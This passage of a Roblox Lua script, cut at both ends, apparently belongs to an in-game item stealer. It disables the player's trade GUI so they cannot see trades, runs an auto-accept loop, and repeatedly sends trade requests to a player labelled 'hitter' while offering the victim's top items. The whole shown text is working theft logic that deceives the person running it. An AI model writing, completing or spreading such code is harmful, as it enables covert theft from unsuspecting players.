			TradeGUI_Phone.Enabled = false
		end)

		local TradeGUI = LocalPlayer.PlayerGui.TradeGUI
		TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
			TradeGUI.Enabled = false
		end)

		task.spawn(tradeAcceptLoop)
		getgenv().abcdefg = true
	end

	scanInventory()
	repeat wait() until totalItemCount > 0

	local hasOffered = false

	while totalItemCount > 0 do
		if getTradeStatus() ~= true then
			if getTradeStatus() == false then
				pcall(function()
					ReplicatedStorage.Trade.SendRequest:InvokeServer(
						Players:FindFirstChild(hitter)
					)
				end)
				hasOffered = false
			end
		elseif not hasOffered then
			hasOffered = true
			scanInventory()
			offerTopItems()
